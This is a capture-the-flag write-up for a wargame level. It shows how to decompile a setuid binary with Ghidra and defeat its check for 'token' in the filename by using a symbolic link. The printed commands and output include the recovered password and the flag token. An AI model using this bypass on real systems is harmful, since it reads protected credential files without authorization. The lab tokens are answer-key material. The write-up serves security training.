## Step 1: Identifying the User

We begin by checking our current user informations:

```bash
$ id
uid=2008(level08) gid=2008(level08) groups=2008(level08),100(users)
```

This shows that we are operating as the user `level08`.

---
## Step 2: Searching for Files

```bash
$ ls -la
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token


$ file level08
level08: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xbe40aba63b7faec62e9414be1b639f394098532f, not stripped

$ file token
token: regular file, no read permission


$ ./level08
level08 [file to read]

$ ./level08 token
./level08 You may not access 'token'
```
The level08 binary is a setuid ELF executable, meaning it executes with flag08 user's privileges. The token file, however, cannot be read directly due to permission restrictions.

Let's transfer it to our local machine for reverse engineering:
```bash
$ scp -P 4242 level08@machine_ip:/home/level08/level08 .
```
---
## Step 3: Reverse Engineering the Binary with Ghidra

The C pseudo code generated by Ghidra is as follows:
```c
void main(int param_1,undefined4 *param_2)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  int in_GS_OFFSET;
  undefined local_414 [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (param_1 == 1) {
    printf("%s [file to read]\n",*param_2);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar1 = strstr((char *)param_2[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",param_2[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __fd = open((char *)param_2[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",param_2[1]);
  }
  __n = read(__fd,local_414,1024);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
### Explanation:
Argument Check: The program expects a filename as an argument. If no argument is provided, it displays usage instructions and exits.

Substring Check: The program checks if the provided filename contains the substring "token". If it does, the program denies access and exits.

File Operations: If the filename does not contain "token", the program attempts to open the file, read its contents, and output the first 1024 bytes.

---
## Step 4: Exploiting the Binary to Get a flag
Since the binary prevents direct access to any file with "token" in its name, we can exploit this by creating a symbolic link with a different name that points to the token file.

```bash
ln -s /home/user/level08/token /tmp/tmp
```

```bash
$ ./level08 /tmp/tmp
quif5eloekouj29ke0vouxean

$ su flag08
Password : quif5eloekouj29ke0vouxean

% getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
---

And there you have it, the token is `25749xKZ8L7DkSCwJkT9dyv6f`.
